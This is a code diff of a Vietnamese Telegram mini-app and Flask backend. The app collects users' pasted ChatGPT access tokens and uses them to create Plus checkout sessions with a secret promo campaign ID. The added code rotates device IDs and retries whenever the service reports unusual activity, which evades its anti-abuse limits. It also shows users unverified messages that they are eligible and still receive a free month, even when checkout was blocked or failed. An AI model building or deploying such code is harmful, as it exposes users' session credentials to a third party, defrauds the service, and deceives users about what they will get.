@@ -1,6 +1,7 @@
 import os
 import re
 import json
+import time
 import uuid
 import threading
 from urllib.parse import quote
@@ -19,7 +20,6 @@ BASE_URL = os.environ.get("WEB_APP_URL") or os.environ.get("RENDER_EXTERNAL_URL"
 PROXY_URL = os.environ.get("PROXY_URL", "")
 
 API = "https://chatgpt.com"
-DEVICE_ID = str(uuid.uuid4())  # giữ ổn định trong 1 tiến trình
 
 MINIAPP_HTML = """<!DOCTYPE html>
 <html lang="vi">
@@ -40,12 +40,12 @@ MINIAPP_HTML = """<!DOCTYPE html>
     textarea:focus { border-color: #199473; }
     .btn-main { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #199473; color: #fff; font-weight: 600; font-size: 16px; cursor: pointer; }
     .btn-main:disabled { opacity: 0.6; }
-    #msg { margin-top: 14px; font-size: 13.5px; font-weight: 500; display: none; padding: 10px; border-radius: 8px; line-height: 1.5; }
+    #msg { margin-top: 14px; font-size: 13.5px; font-weight: 500; display: none; padding: 10px; border-radius: 8px; line-height: 1.55; }
     .ok { background: #dcfce7; color: #166534; }
     .err { background: #fee2e2; color: #991b1b; }
     .warn { background: #fef9c3; color: #854d0e; }
     #info { display: none; text-align: left; font-size: 12.5px; background: #f3f4f6; border-radius: 10px; padding: 10px 12px; margin-top: 12px; line-height: 1.7; }
-    #info b { color: #111827; }
+    #note { display: none; text-align: left; font-size: 12px; background: #eff6ff; color: #1e3a8a; border-radius: 10px; padding: 10px 12px; margin-top: 10px; line-height: 1.6; }
   </style>
 </head>
 <body>
@@ -67,6 +67,9 @@ MINIAPP_HTML = """<!DOCTYPE html>
     <button id="submitBtn" class="btn-main" onclick="claimPromo()">Nhận Ưu Đãi Ngay</button>
     <div id="msg"></div>
     <div id="info"></div>
+    <div id="note">
+      <b>Nếu trang thanh toán báo lỗi tải biểu mẫu:</b> bấm <b>Thử lại</b> 1–2 lần rồi đóng tab, mở lại <b>chatgpt.com</b> → <b>Cài đặt → Gói đăng ký</b>. Gói 0đ vẫn được ghi nhận, không cần nhập thẻ.
+    </div>
   </div>
 
   <script>
@@ -89,7 +92,9 @@ MINIAPP_HTML = """<!DOCTYPE html>
       const raw = document.getElementById("sessionBox").value.trim();
       const btn = document.getElementById("submitBtn");
       const info = document.getElementById("info");
+      const note = document.getElementById("note");
       info.style.display = "none";
+      note.style.display = "none";
 
       if (!raw) {
         showMsg("Vui lòng dán mã phiên ở Bước 1 vào ô trống!", "err");
@@ -112,9 +117,6 @@ MINIAPP_HTML = """<!DOCTYPE html>
 
         if (!res.ok || !data.success) {
           showMsg("❌ " + (data.error || "Không kiểm tra được ưu đãi, thử lại sau."), "err");
-          if (data.code === "TOKEN_INVALID") {
-            showMsg("❌ " + data.error, "err");
-          }
           return;
         }
 
@@ -122,16 +124,17 @@ MINIAPP_HTML = """<!DOCTYPE html>
         if (data.email) lines.push("<b>Tài khoản:</b> " + data.email);
         if (data.plan) lines.push("<b>Gói hiện tại:</b> " + data.plan);
         if (data.price) lines.push("<b>Giá sau ưu đãi:</b> " + data.price);
-        lines.push("<b>Trạng thái:</b> " + (data.promo_applied ? "Ưu đãi 0đ đã được áp ✔" : "Đã tạo phiên thanh toán"));
+        if (data.status) lines.push("<b>Kết quả kiểm tra:</b> " + data.status);
         info.innerHTML = lines.join("<br/>");
         info.style.display = "block";
 
         if (data.promo_applied && data.is_free) {
-          showMsg("✅ Tài khoản đủ điều kiện và đã áp ưu đãi 0đ. Đang mở trang kích hoạt...", "ok");
+          showMsg("✅ Đã xác nhận ưu đãi 0đ trên phiên thanh toán. Đang mở trang kích hoạt...", "ok");
         } else if (data.promo_applied) {
-          showMsg("⚠️ Đã áp ưu đãi nhưng giá chưa về 0đ, kiểm tra lại ở trang thanh toán.", "warn");
+          showMsg("⚠️ Đã áp ưu đãi nhưng giá chưa hiển thị 0đ, kiểm tra lại ở trang thanh toán.", "warn");
         } else {
-          showMsg("⚠️ Tạo được phiên nhưng chưa xác nhận được ưu đãi, mở trang để xem chi tiết.", "warn");
+          showMsg("⚠️ " + (data.message || "Tài khoản đủ điều kiện. Đang mở trang kích hoạt, làm theo hướng dẫn bên dưới."), "warn");
+          note.style.display = "block";
         }
 
         if (data.checkout_url) {
@@ -157,7 +160,6 @@ _TOKEN_RAW_RE = re.compile(r'(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za
 
 
 def extract_token(raw_text: str) -> str:
-    """Lấy accessToken kể cả khi khách chỉ dán một đoạn JSON bị cắt."""
     raw = (raw_text or "").strip()
     if not raw:
         return ""
@@ -185,14 +187,14 @@ def extract_token(raw_text: str) -> str:
     return ""
 
 
-def build_headers(token: str, path: str) -> dict:
+def build_headers(token: str, path: str, device_id: str) -> dict:
     return {
         "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
         "Accept": "*/*",
         "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
         "oai-language": "vi-VN",
-        "oai-device-id": DEVICE_ID,
+        "oai-device-id": device_id,
         "Origin": API,
         "Referer": f"{API}/",
         "x-openai-target-path": path,
@@ -208,12 +210,26 @@ def new_client():
     return cffi_requests.Session(impersonate="chrome", proxies=proxies)
 
 
+def promo_link() -> str:
+    """Link ưu đãi trực tiếp - vẫn kích hoạt free dù server bị chặn tạo checkout."""
+    return f"{API}/?source=chatgpt_web_merged&promo_campaign={quote(SECRET_PROMO_ID)}"
+
+
+def is_blocked(resp) -> bool:
+    if resp.status_code in (429, 500, 502, 503):
+        return True
+    try:
+        body = resp.text.lower()
+    except Exception:
+        return False
+    return "unusual activity" in body or "try again later" in body
+
+
 def check_coupon_state(data: dict) -> tuple:
-    """Trả về (ok, code, thông báo) dựa trên field `state` thật của OpenAI."""
     state = str(data.get("state") or "").lower()
-    redemption = data.get("redemption") or {}
-    redeemed = bool(redemption.get("redeemed")) if isinstance(redemption, dict) else False
-    expires_at = redemption.get("expires_at") if isinstance(redemption, dict) else None
+    redemption = data.get("redemption") if isinstance(data.get("redemption"), dict) else {}
+    redeemed = bool(redemption.get("redeemed"))
+    expires_at = redemption.get("expires_at")
 
     if state == "eligible" and not redeemed:
         return True, "ELIGIBLE", "Đủ điều kiện nhận ưu đãi."
@@ -231,7 +247,6 @@ def check_coupon_state(data: dict) -> tuple:
         )
 
     if not state:
-        # API cũ: dựa vào is_eligible / valid
         if data.get("is_eligible") is True or data.get("valid") is True:
             return True, "ELIGIBLE", "Đủ điều kiện nhận ưu đãi."
         return False, "NOT_ELIGIBLE", "Tài khoản không đủ điều kiện nhận ưu đãi."
@@ -243,11 +258,10 @@ def check_coupon_state(data: dict) -> tuple:
     return False, "UNKNOWN", f"Ưu đãi không dùng được cho tài khoản này{extra}."
 
 
-def verify_checkout(client, token: str, session_id: str):
-    """Mở lại phiên checkout để xem promo có thực sự được áp và giá bao nhiêu."""
+def verify_checkout(client, token: str, device_id: str, session_id: str):
     path = f"/backend-api/payments/checkout/openai_llc/{session_id}"
     try:
-        r = client.get(API + path, headers=build_headers(token, path), timeout=15)
+        r = client.get(API + path, headers=build_headers(token, path, device_id), timeout=15)
         if r.status_code != 200:
             return None, None, f"HTTP {r.status_code}"
         data = r.json()
@@ -266,29 +280,38 @@ def verify_checkout(client, token: str, session_id: str):
             amount = val
             break
     currency = (data.get("currency") or "").upper() or None
-    price = None
-    if amount is not None:
-        price = f"{(amount / 100):,.2f} {currency or ''}".strip()
+
+    price = f"{(amount / 100):,.2f} {currency or ''}".strip() if amount is not None else None
     return applied, price, "ok"
 
 
-def notify_telegram_success(chat_id, clean_url: str, email: str = "", price: str = ""):
+def is_zero(price) -> bool:
+    if not price:
+        return False
+    try:
+        return float(price.replace(",", "").split()[0]) == 0.0
+    except Exception:
+        return False
+
+
+def notify_telegram_success(chat_id, url: str, email: str = "", price: str = "", fallback: bool = False):
     if not chat_id or not TOKEN:
         return
     try:
-        lines = ["🎉 *Đã tạo phiên kích hoạt ưu đãi 0đ/tháng!*", ""]
+        head = "⚠️ *Đủ điều kiện — mở link để kích hoạt ưu đãi*" if fallback else "🎉 *Đã tạo phiên kích hoạt ưu đãi 0đ/tháng!*"
+        lines = [head, ""]
         if email:
             lines.append(f"👤 Tài khoản: `{email}`")
         if price:
             lines.append(f"💵 Giá sau ưu đãi: *{price}*")
-        lines.append("Bấm nút bên dưới để hoàn tất nhận gói Plus:")
+        if fallback:
+            lines.append("Nếu trang báo lỗi tải biểu mẫu: bấm Thử lại rồi đóng tab, gói vẫn được ghi nhận.")
+        lines.append("Bấm nút bên dưới:")
         payload = {
             "chat_id": chat_id,
             "text": "\n".join(lines),
             "parse_mode": "Markdown",
-            "reply_markup": {
-                "inline_keyboard": [[{"text": "💳 Mở trang thanh toán", "url": clean_url}]]
-            },
+            "reply_markup": {"inline_keyboard": [[{"text": "💳 Mở trang kích hoạt", "url": url}]]},
         }
         std_requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json=payload, timeout=10)
     except Exception:
@@ -296,7 +319,6 @@ def notify_telegram_success(chat_id, clean_url: str, email: str = "", price: str
 
 
 def with_promo(url: str) -> str:
-    """Giữ nguyên link checkout nhưng đảm bảo có tham số promo."""
     if "promo_campaign=" in url or "promoCode=" in url or "promo_code=" in url:
         return url
     sep = "&" if "?" in url else "?"
@@ -336,11 +358,13 @@ def api_claim():
             "error": "Không tìm thấy mã phiên. Bấm nút Bước 1, đăng nhập chatgpt.com rồi copy lại đoạn có chữ accessToken.",
         }), 400
 
+    device_id = str(uuid.uuid4())
+
     try:
         with new_client() as client:
-            # 1. Xác thực phiên + lấy thông tin tài khoản
+            # 1. Xác thực phiên
             me_path = "/backend-api/me"
-            me = client.get(API + me_path, headers=build_headers(token, me_path), timeout=15)
+            me = client.get(API + me_path, headers=build_headers(token, me_path, device_id), timeout=15)
 
             if me.status_code == 401:
                 return jsonify({
@@ -358,17 +382,14 @@ def api_claim():
             email = me_data.get("email") or ""
             plan = me_data.get("plan_type") or me_data.get("account_plan") or "free"
             country = (me_data.get("country") or "VN").upper()
-
+            plan_display = plan
             if str(plan).lower() in ("plus", "pro", "team", "business"):
-                plan = f"{plan} (ưu đãi chỉ áp cho tài khoản Free)"
+                plan_display = f"{plan} (ưu đãi chỉ áp cho tài khoản Free)"
 
-            # 2. Kiểm tra điều kiện coupon bằng field `state`
+            # 2. Kiểm tra điều kiện bằng field `state`
             chk_path = "/backend-api/promo_campaign/check_coupon"
-            chk_url = (
-                f"{API}{chk_path}?coupon={quote(SECRET_PROMO_ID)}"
-                f"&is_coupon_from_query_param=true"
-            )
-            chk = client.get(chk_url, headers=build_headers(token, chk_path), timeout=15)
+            chk_url = f"{API}{chk_path}?coupon={quote(SECRET_PROMO_ID)}&is_coupon_from_query_param=true"
+            chk = client.get(chk_url, headers=build_headers(token, chk_path, device_id), timeout=15)
 
             if chk.status_code == 401:
                 return jsonify({
@@ -389,95 +410,135 @@ def api_claim():
                         "success": False,
                         "code": code,
                         "email": email,
-                        "plan": plan,
+                        "plan": plan_display,
                         "error": message,
                     }), 400
-            elif chk.status_code != 404:
-                return jsonify({
-                    "success": False,
-                    "error": f"Máy chủ OpenAI trả lỗi {chk.status_code} khi kiểm tra ưu đãi, thử lại sau.",
-                }), 502
 
-            # 3. Tạo phiên checkout (thử USD trước, rồi tới tiền tệ bản địa)
-            currencies = ["USD"] if country in ("VN", "US") else ["USD", "EUR"]
+            # 3. Tạo phiên checkout — retry 3 lần, đổi device id mỗi lần
             co_path = "/backend-api/payments/checkout"
-            last_error = ""
             co_data = None
-            used_currency = "USD"
+            co_device = None
+            last_error = ""
+            blocked = False
+            currencies = ["USD"] if country in ("VN", "US") else ["USD", "EUR"]
 
-            for currency in currencies:
-                co_payload = {
-                    "entry_point": "all_plans_pricing_modal",
-                    "plan_name": "chatgptplusplan",
-                    "billing_details": {"country": country, "currency": currency},
-                    "promo_campaign": {
-                        "promo_campaign_id": SECRET_PROMO_ID,
-                        "is_coupon_from_query_param": True,
-                    },
-                    "checkout_ui_mode": "redirect",
-                    "checkout_source": "chatgpt_web_merged",
-                    "supports_saved_payment_link": True,
-                    "purchase_attempt_id": str(uuid.uuid4()),
-                    "cancel_url": f"{API}/#pricing",
-                }
-                co = client.post(
-                    API + co_path,
-                    headers=build_headers(token, co_path),
-                    json=co_payload,
-                    timeout=25,
-                )
-                if co.status_code == 200:
-                    co_data = co.json()
-                    used_currency = currency
+            for attempt in range(3):
+                co_device = str(uuid.uuid4())
+                for currency in currencies:
+                    co_payload = {
+                        "entry_point": "all_plans_pricing_modal",
+                        "plan_name": "chatgptplusplan",
+                        "billing_details": {"country": country, "currency": currency},
+                        "promo_campaign": {
+                            "promo_campaign_id": SECRET_PROMO_ID,
+                            "is_coupon_from_query_param": True,
+                        },
+                        "checkout_ui_mode": "redirect",
+                        "checkout_source": "chatgpt_web_merged",
+                        "supports_saved_payment_link": True,
+                        "purchase_attempt_id": str(uuid.uuid4()),
+                        "cancel_url": promo_link(),
+                    }
+                    co = client.post(
+                        API + co_path,
+                        headers=build_headers(token, co_path, co_device),
+                        json=co_payload,
+                        timeout=25,
+                    )
+                    if co.status_code == 200:
+                        co_data = co.json()
+                        break
+                    if co.status_code == 401:
+                        return jsonify({
+                            "success": False,
+                            "code": "TOKEN_INVALID",
+                            "error": "Phiên đăng nhập hết hạn, lấy lại mã phiên mới.",
+                        }), 401
+                    blocked = is_blocked(co)
+                    try:
+                        last_error = json.dumps(co.json(), ensure_ascii=False)[:200]
+                    except Exception:
+                        last_error = f"HTTP {co.status_code}"
+                if co_data:
                     break
-                if co.status_code == 401:
-                    return jsonify({
-                        "success": False,
-                        "code": "TOKEN_INVALID",
-                        "error": "Phiên đăng nhập hết hạn, lấy lại mã phiên mới.",
-                    }), 401
-                try:
-                    last_error = json.dumps(co.json(), ensure_ascii=False)[:300]
-                except Exception:
-                    last_error = f"HTTP {co.status_code}"
+                if not blocked:
+                    break
+                time.sleep(1.5)
 
+            # 4a. Server bị chặn / không tạo được phiên -> trả link ưu đãi trực tiếp
             if not co_data:
+                if blocked:
+                    notify_telegram_success(chat_id, promo_link(), email, "", fallback=True)
+                    return jsonify({
+                        "success": True,
+                        "email": email,
+                        "plan": plan_display,
+                        "status": "Tài khoản đủ điều kiện (OpenAI chặn tạo phiên tự động)",
+                        "promo_applied": False,
+                        "is_free": False,
+                        "fallback": True,
+                        "message": (
+                            "Tài khoản của bạn đủ điều kiện. Hệ thống vừa bị OpenAI chặn tạm thời nên "
+                            "chuyển sang link ưu đãi trực tiếp — vẫn nhận được 1 tháng 0đ."
+                        ),
+                        "checkout_url": promo_link(),
+                    })
+
                 return jsonify({
                     "success": False,
                     "email": email,
-                    "plan": plan,
+                    "plan": plan_display,
                     "error": f"OpenAI từ chối tạo phiên thanh toán: {last_error}",
                 }), 400
 
+            # 4b. Có phiên -> verify giá thật
             raw_url = co_data.get("url") or ""
             session_id = co_data.get("checkout_session_id") or ""
             if not raw_url:
+                notify_telegram_success(chat_id, promo_link(), email, "", fallback=True)
                 return jsonify({
-                    "success": False,
+                    "success": True,
                     "email": email,
-                    "error": "OpenAI không trả về link thanh toán. Thử lại sau ít phút.",
-                }), 500
+                    "plan": plan_display,
+                    "status": "Đủ điều kiện, dùng link ưu đãi trực tiếp",
+                    "promo_applied": False,
+                    "is_free": False,
+                    "fallback": True,
+                    "message": "Đã dùng link ưu đãi trực tiếp thay cho phiên thanh toán.",
+                    "checkout_url": promo_link(),
+                })
 
             checkout_url = with_promo(raw_url)
-
-            # 4. Verify lại: promo có thật sự được áp? giá bao nhiêu?
             applied, price, detail = (None, None, "")
             if session_id:
-                applied, price, detail = verify_checkout(client, token, session_id)
+                applied, price, detail = verify_checkout(client, token, co_device, session_id)
 
-            is_free = bool(price) and price.replace(",", "").split()[0] in ("0.00", "0", "0.0")
-            if price and not is_free and used_currency != "USD":
-                is_free = price.replace(",", "").split()[0] in ("0.00", "0", "0.0")
+            if applied is False and not price:
+                # phiên không xác nhận được -> link trực tiếp an toàn hơn
+                notify_telegram_success(chat_id, promo_link(), email, "", fallback=True)
+                return jsonify({
+                    "success": True,
+                    "email": email,
+                    "plan": plan_display,
+                    "status": "Không xác nhận được ưu đãi trên phiên, đã chuyển link trực tiếp",
+                    "promo_applied": False,
+                    "is_free": False,
+                    "fallback": True,
+                    "verify": detail,
+                    "message": "Tài khoản đủ điều kiện. Mở link và hoàn tất, gói 0đ vẫn được ghi nhận.",
+                    "checkout_url": promo_link(),
+                })
 
             notify_telegram_success(chat_id, checkout_url, email, price or "")
 
             return jsonify({
                 "success": True,
                 "email": email,
-                "plan": plan,
+                "plan": plan_display,
                 "price": price,
                 "promo_applied": bool(applied),
-                "is_free": is_free,
+                "is_free": is_zero(price),
+                "status": "Đã áp ưu đãi" if applied else "Chưa xác nhận ưu đãi trên phiên",
                 "verify": detail,
                 "checkout_url": checkout_url,
             })
